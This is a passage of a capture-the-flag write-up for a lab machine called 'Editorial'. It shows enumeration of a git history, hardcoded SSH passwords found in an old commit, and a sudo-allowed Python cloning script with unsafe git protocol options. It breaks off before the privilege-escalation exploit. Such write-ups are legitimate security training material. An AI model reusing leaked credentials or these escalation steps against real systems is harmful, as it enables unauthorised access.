+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;1.1&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;api_route&#34;</span>: <span style="color:#f1fa8c">&#34;/api/v1.1/metadata/&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_1&#34;</span>: <span style="color:#f1fa8c">&#34;soporte@tiempoarriba.oc&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;editorial&#34;</span>: <span style="color:#f1fa8c">&#34;Ed Tiempo Arriba&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;1.2&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_1&#34;</span>: <span style="color:#f1fa8c">&#34;soporte@tiempoarriba.oc&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;editorial&#34;</span>: <span style="color:#f1fa8c">&#34;Editorial Tiempo Arriba&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/v1.2/metadata/&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;2&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.moc.oc&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;editorial&#34;</span>: <span style="color:#f1fa8c">&#34;Editorial Tiempo Arriba&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/v2/metadata/&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p><strong>coupons</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;2anniversaryTWOandFOURread4&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;valid_until&#34;</span>: <span style="color:#f1fa8c">&#34;12/02/2024&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;frEsh11bookS230&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;valid_until&#34;</span>: <span style="color:#f1fa8c">&#34;31/11/2023&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><h3 id="foothold">Foothold</h3>
+<p>I used the credential from the authors to try to SSH into the box and it worked.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>dev:dev080217_devAPI!@
+</span></span></code></pre></div><p><img src="images/20240618083237.png" alt="alt text"></p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>After, successfully getting <code>dev</code>&rsquo;s SSH shell. Let&rsquo;s enumerate the target using LinPEAS.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span>I found a vulnerable version of <span style="color:#ff79c6">`</span>screen v4.<span style="color:#bd93f9">09</span>.<span style="color:#bd93f9">00</span><span style="color:#ff79c6">`</span> but the [exploit](https:<span style="color:#ff79c6">//</span>www.exploit<span style="color:#ff79c6">-</span>db.com<span style="color:#ff79c6">/</span>exploits<span style="color:#ff79c6">/</span><span style="color:#bd93f9">51252</span>) didn<span style="color:#f1fa8c">&#39;t work. To exploit this we needed the `screen` to have setuid bit set by root.
+</span></span></span></code></pre></div><p><strong>Users that exist on the box.</strong>
+<img src="images/20240618180158.png" alt="alt text"></p>
+<p><strong>Found a git initialized directory.</strong>
+<img src="images/20240618174809.png" alt="alt text"></p>
+<p>After enumerating the <code>apps</code> folder with <code>git</code> I found some interesting commits.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git log
+</span></span><span style="display:flex;"><span>commit 8ad0f3187e2bda88bba85074635ea942974587e8 <span style="color:#ff79c6">(</span>HEAD -&gt; master<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 21:04:21 <span style="color:#bd93f9">2023</span> -0500
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    fix: bugfix in api port endpoint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit dfef9f20e57d730b7d71967582035925d57ad883
+</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 21:01:11 <span style="color:#bd93f9">2023</span> -0500
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    change: remove debug and update api port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 20:55:08 <span style="color:#bd93f9">2023</span> -0500
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    change<span style="color:#ff79c6">(</span>api<span style="color:#ff79c6">)</span>: downgrading prod to dev
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    * To use development environment.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit 1e84a036b2f33c59e2390730699a488c65643d28
+</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 20:51:10 <span style="color:#bd93f9">2023</span> -0500
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    feat: create api to editorial info
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    * It <span style="color:#ff79c6">(</span>will<span style="color:#ff79c6">)</span> contains internal info about the editorial, this <span style="color:#8be9fd;font-style:italic">enable</span>
+</span></span><span style="display:flex;"><span>       faster access to information.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
+</span></span><span style="display:flex;"><span>Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+</span></span><span style="display:flex;"><span>Date:   Sun Apr <span style="color:#bd93f9">30</span> 20:48:43 <span style="color:#bd93f9">2023</span> -0500
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    feat: create editorial app
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    * This contains the base of this project.
+</span></span><span style="display:flex;"><span>    * Also we add a feature to <span style="color:#8be9fd;font-style:italic">enable</span> to external authors send us their
+</span></span><span style="display:flex;"><span>       books and validate a future post in our editorial.
+</span></span></code></pre></div><p>The commit before <code>change(api): downgrading prod to dev</code> looks very interesting, It says <code>It (will) contains internal info about the editorial, this enable faster access to information.</code> Let&rsquo;s checkout the commit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev@editorial:~/apps$ git checkout 1e84a036b2f33c59e2390730699a488c65643d28
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.min.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.min.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.rtl.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.rtl.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.rtl.min.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-grid.rtl.min.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.min.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.min.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.rtl.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.rtl.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.rtl.min.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-reboot.rtl.min.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.min.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.min.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.rtl.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.rtl.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.rtl.min.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap-utilities.rtl.min.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.min.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.min.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.rtl.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.rtl.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.rtl.min.css
+</span></span><span style="display:flex;"><span>D	app_editorial/static/css/bootstrap.rtl.min.css.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/images/login-background.jpg
+</span></span><span style="display:flex;"><span>D	app_editorial/static/images/pexels-janko-ferlic-590493.jpg
+</span></span><span style="display:flex;"><span>D	app_editorial/static/images/pexels-min-an-694740.jpg
+</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.bundle.js
+</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.bundle.js.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.bundle.min.js
+</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.bundle.min.js.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.esm.js
+</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.esm.js.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.esm.min.js
+</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.esm.min.js.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.js
+</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.js.map
+</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.min.js
+</span></span><span style="display:flex;"><span>D	app_editorial/static/js/bootstrap.min.js.map
+</span></span><span style="display:flex;"><span>D	app_editorial/templates/about.html
+</span></span><span style="display:flex;"><span>D	app_editorial/templates/index.html
+</span></span><span style="display:flex;"><span>D	app_editorial/templates/upload.html
+</span></span><span style="display:flex;"><span>Note: switching to <span style="color:#f1fa8c">&#39;1e84a036b2f33c59e2390730699a488c65643d28&#39;</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>You are in <span style="color:#f1fa8c">&#39;detached HEAD&#39;</span> state. You can look around, make experimental
+</span></span><span style="display:flex;"><span>changes and commit them, and you can discard any commits you make in this
+</span></span><span style="display:flex;"><span>state without impacting any branches by switching back to a branch.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>If you want to create a new branch to retain commits you create, you may
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">do</span> so <span style="color:#ff79c6">(</span>now or later<span style="color:#ff79c6">)</span> by using -c with the switch command. Example:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  git switch -c &lt;new-branch-name&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Or undo this operation with:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  git switch -
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Turn off this advice by setting config variable advice.detachedHead to <span style="color:#8be9fd;font-style:italic">false</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HEAD is now at 1e84a03 feat: create api to editorial info
+</span></span></code></pre></div><p>After, checking out that commit I found two folders <code>app_api</code> and <code>app_editorial</code>. The <code>app_api</code> was the app that leaked the credential for <code>dev</code> user and gave us foothold.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev@editorial:~/apps$ ls
+</span></span><span style="display:flex;"><span>app_api  app_editorial
+</span></span><span style="display:flex;"><span>dev@editorial:~/apps$ <span style="color:#8be9fd;font-style:italic">cd</span> app_
+</span></span><span style="display:flex;"><span>-bash: cd: app_: No such file or directory
+</span></span><span style="display:flex;"><span>dev@editorial:~/apps$ <span style="color:#8be9fd;font-style:italic">cd</span> app_api/
+</span></span><span style="display:flex;"><span>dev@editorial:~/apps/app_api$ ls
+</span></span><span style="display:flex;"><span>app.py
+</span></span></code></pre></div><p>Let&rsquo;s see what&rsquo;s inside the <code>app.py</code> file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev@editorial:~/apps/app_api$ cat app.py 
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># API (in development).</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># * To retrieve info about editorial</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>import json
+</span></span><span style="display:flex;"><span>from flask import Flask, jsonify
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># App configuration</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">app</span> <span style="color:#ff79c6">=</span> Flask<span style="color:#ff79c6">(</span>__name__<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Global Variables</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">api_route</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/api/latest/metadata&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">api_editorial_name</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Editorial Tiempo Arriba&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">api_editorial_email</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;info@tiempoarriba.htb&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># API routes</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -- : home</span>
+</span></span><span style="display:flex;"><span>@app.route<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;/api&#39;</span>, <span style="color:#8be9fd;font-style:italic">methods</span><span style="color:#ff79c6">=[</span><span style="color:#f1fa8c">&#39;GET&#39;</span><span style="color:#ff79c6">])</span>
+</span></span><span style="display:flex;"><span>def index<span style="color:#ff79c6">()</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">data_editorial</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;version&#39;</span>: <span style="color:#ff79c6">[{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;1&#39;</span>: <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: <span style="color:#f1fa8c">&#39;Editorial El Tiempo Por Arriba&#39;</span>, 
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_1&#39;</span>: <span style="color:#f1fa8c">&#39;soporte@tiempoarriba.oc&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_2&#39;</span>: <span style="color:#f1fa8c">&#39;info@tiempoarriba.oc&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: <span style="color:#f1fa8c">&#39;/api/v1/metadata/&#39;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}}</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;1.1&#39;</span>: <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: <span style="color:#f1fa8c">&#39;Ed Tiempo Arriba&#39;</span>, 
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_1&#39;</span>: <span style="color:#f1fa8c">&#39;soporte@tiempoarriba.oc&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_2&#39;</span>: <span style="color:#f1fa8c">&#39;info@tiempoarriba.oc&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: <span style="color:#f1fa8c">&#39;/api/v1.1/metadata/&#39;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}}</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;1.2&#39;</span>: <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: api_editorial_name, 
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_1&#39;</span>: <span style="color:#f1fa8c">&#39;soporte@tiempoarriba.oc&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email_2&#39;</span>: <span style="color:#f1fa8c">&#39;info@tiempoarriba.oc&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: f<span style="color:#f1fa8c">&#39;/api/v1.2/metadata/&#39;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}}</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;2&#39;</span>: <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: api_editorial_name, 
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email&#39;</span>: <span style="color:#f1fa8c">&#39;info@tiempoarriba.moc.oc&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: f<span style="color:#f1fa8c">&#39;/api/v2/metadata/&#39;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}}</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;2.3&#39;</span>: <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;editorial&#39;</span>: api_editorial_name, 
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;contact_email&#39;</span>: api_editorial_email,
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#39;api_route&#39;</span>: f<span style="color:#f1fa8c">&#39;{api_route}/&#39;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> jsonify<span style="color:#ff79c6">(</span>data_editorial<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -- : (development) mail message to new authors</span>
+</span></span><span style="display:flex;"><span>@app.route<span style="color:#ff79c6">(</span>api_route + <span style="color:#f1fa8c">&#39;/authors/message&#39;</span>, <span style="color:#8be9fd;font-style:italic">methods</span><span style="color:#ff79c6">=[</span><span style="color:#f1fa8c">&#39;GET&#39;</span><span style="color:#ff79c6">])</span>
+</span></span><span style="display:flex;"><span>def api_mail_new_authors<span style="color:#ff79c6">()</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> jsonify<span style="color:#ff79c6">({</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;template_mail_message&#39;</span>: <span style="color:#f1fa8c">&#34;Welcome to the team! We are thrilled to have you on board and can&#39;t wait to see the incredible content you&#39;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#39;t hesitate to reach out if you have any questions or ideas - we&#39;re always here to support you.\n\nBest regards, &#34;</span> + api_editorial_name + <span style="color:#f1fa8c">&#34; Team.&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">})</span> <span style="color:#6272a4"># TODO: replace dev credentials when checks pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Start program</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">__name__</span> <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app.run<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">host</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>, <span style="color:#8be9fd;font-style:italic">port</span><span style="color:#ff79c6">=</span>5001, <span style="color:#8be9fd;font-style:italic">debug</span><span style="color:#ff79c6">=</span>True<span style="color:#ff79c6">)</span>
+</span></span></code></pre></div><p>Looks like the we credentials for <code>prod</code> user. Let&rsquo;s try to SSH into the box as <code>prod</code> with the following credential.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>prod:080217_Producti0n_2023!@
+</span></span></code></pre></div><p>Successfully logged in as <code>prod</code>.
+<img src="images/20240618181004.png" alt="alt text"></p>
+<p>The user <code>prod</code> can run only the following script as sudo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>sudo<span style="color:#ff79c6">]</span> password <span style="color:#ff79c6">for</span> prod: 
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff79c6">for</span> prod on editorial:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin,
+</span></span><span style="display:flex;"><span>    use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User prod may run the following commands on editorial:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
+</span></span></code></pre></div><p>Let&rsquo;s see what the script looks like.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>import os
+</span></span><span style="display:flex;"><span>import sys
+</span></span><span style="display:flex;"><span>from git import Repo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>os.chdir<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;/opt/internal_apps/clone_changes&#39;</span><span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">url_to_clone</span> <span style="color:#ff79c6">=</span> sys.argv<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">r</span> <span style="color:#ff79c6">=</span> Repo.init<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#8be9fd;font-style:italic">bare</span><span style="color:#ff79c6">=</span>True<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>r.clone_from<span style="color:#ff79c6">(</span>url_to_clone, <span style="color:#f1fa8c">&#39;new_changes&#39;</span>, <span style="color:#8be9fd;font-style:italic">multi_options</span><span style="color:#ff79c6">=[</span><span style="color:#f1fa8c">&#34;-c protocol.ext.allow=always&#34;</span><span style="color:#ff79c6">])</span>
+</span></span></code></pre></div><p>The script is cloning a repository from a remote URL. And it&rsquo;s using a git library. Let&rsquo;s see which python package is that.</p>
